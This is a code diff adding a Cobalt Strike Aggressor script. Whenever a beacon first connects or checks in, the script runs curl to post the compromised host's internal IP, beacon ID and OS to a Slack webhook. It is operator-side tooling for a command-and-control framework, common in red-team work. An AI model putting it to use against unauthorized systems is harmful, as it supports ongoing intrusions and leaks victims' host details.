@@ -1,0 +1,26 @@
+$slack_channel = "";
+$slack_emoji = '';
+$slack_webhookURL = '';
+
+on beacon_initial {
+		local('$internal $beacon $os');
+		$internal = beacon_info($1, "internal");
+		$beacon = beacon_info($1, "id");
+		$os = beacon_info($1, "os");
+
+		@curl_command = @('curl','-X','POST','--data-urlencode','payload={"username": "Cobalt Strike Notifier Bot", "icon_emoji": "' . $slack_emoji. '", "channel": "' . $slack_channel . '", "text":"teamserver new beacon on ' . $internal . '; beacon id: ' . $beacon . '; platform: ' . $os . '; type: cobaltstrike"}',$slack_webhookURL);
+
+		exec(@curl_command);
+
+		bcheckin($beacon);
+}
+
+on beacon_checkin {
+	$beacon = beacon_info($1, "id");
+
+	@curl_command = @('curl','-X','POST','--data-urlencode','payload={"username": "Cobalt Strike Notifier Bot", "icon_emoji": "' . $slack_emoji. '", "channel": "' . $slack_channel . '", "text":"cobaltstrike beacon ' . $beacon . ' checked in"}',$slack_webhookURL);
+
+	exec(@curl_command);
+
+	bcheckin($beacon);
+}
